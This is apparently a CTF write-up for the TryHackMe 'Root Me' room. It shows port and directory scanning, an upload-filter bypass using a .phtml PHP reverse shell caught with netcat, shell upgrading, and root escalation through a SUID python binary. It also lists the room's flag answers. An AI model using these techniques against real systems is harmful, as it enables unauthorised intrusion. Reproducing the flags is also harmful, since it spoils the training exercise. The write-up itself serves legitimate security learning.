# Root Me

**Date:** 17, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/rrootme) to go to the TryHackMe room.

## Reconnaissance

```bash
$ nmap -sC -sV 10.10.202.137 -oN nmap.out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 01:01 IST
Nmap scan report for 10.10.202.137
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.60 seconds
```

### Scan the machine, how many ports are open?
- **Answer:** 2

### What version of Apache is running?
- **Answer:** 2.4.29

### What service is running on port 22?
- **Answer:** ssh

### Find directories on the web server using the GoBuster tool.

```bash
$ gobuster dir -u http://10.10.202.137 -t 50 -w /usr/share/wordlists/dirb/common.txt | tee gobuster.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.202.137
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/17 01:06:28 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.202.137/css/]
/index.php            (Status: 200) [Size: 616]                                
/js                   (Status: 301) [Size: 311] [--> http://10.10.202.137/js/] 
/panel                (Status: 301) [Size: 314] [--> http://10.10.202.137/panel/]
/server-status        (Status: 403) [Size: 278]                                  
/uploads              (Status: 301) [Size: 316] [--> http://10.10.202.137/uploads/]
                                                                                   
===============================================================
2021/05/17 01:06:48 Finished
===============================================================
```

### What is the hidden directory?
- **Answer:** /panel/

---

## Getting a shell

- Visit `http://10.10.202.137/panel/`.

### Filter Bypass Attempt 1
- Initially, I tried to upload file `php-reverse-shell.php` (Don't forget to put your IP and Port in the file), which gave the following output:

```
PHP não é permitido!

(In Portuguese, which translates to)
PHP is not allowed!
```

### Filter Bypass Attempt 2
- To bypass the filter, change the file name to `php-reverse-shell.php.jpg` and then try uploading:

```
O arquivo foi upado com sucesso!

(In Portuguese, which translates to)
The file was successfully uploaded!
```

- Listen on the appropriate port using netcat: `nc -lvnp 1234`
- Open the uploaded file in the browser: `http://10.10.202.137/uploads/php-reverse-shell.php.jpg`
- But unfortunately the image couldn't be opened. So, we need to look for some other filter bypass

### Filter Bypass Attempt 3
- Change the file name to `php-reverse-shell.phtml` and upload it.

```
O arquivo foi upado com sucesso!

(In Portuguese, which translates to)
The file was successfully uploaded!
```

- Now, visit `http://10.10.202.137/uploads/php-reverse-shell.phtml`.
- The code was executed and the reverse shell was obtained as the user **www-data**.
- We'll upgrade it to a stable shell:

```bash
nc -lvnp 1234
listening on [any] 1234 ...

connect to [10.17.7.91] from (UNKNOWN) [10.10.202.137] 36914
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:51:37 up 22 min,  0 users,  load average: 0.00, 0.26, 1.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ^Z
[1]+  Stopped                 nc -lvnp 1234

root@kali:~# stty raw -echo; fg
nc -lvnp 1234

www-data@rootme:/$ id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### user.txt
- **Answer:** THM{y0u_g0t_a_sh3ll}
- **Steps to Reproduce:** 

```bash
$ www-data@rootme:/$ find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt
www-data@rootme:/$ cat /var/www/user.txt                      
THM{y0u_g0t_a_sh3ll}
```

---

## Privilege Escalation

### Search for files with SUID permission, which file is weird?
- **Answer:** /usr/bin/python
- **Steps to Reproduce:** 

```bash
$ find / -perm -u=s -type f 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

### Abusing SUID bit of /usr/share/python

- Look for the exploit in [GTFO bins](https://gtfobins.github.io/gtfobins/python/)
- Here, we set the UID to 0 (root).

```bash
www-data@rootme:/$ python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

### root.txt
- **Answer:** THM{pr1v1l3g3_3sc4l4t10n}
- **Steps to Reproduce:** 

```bash
# find / -name "root.txt" -type f 2>/dev/null
/root/root.txt
# cd /root
# ls
root.txt
# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

---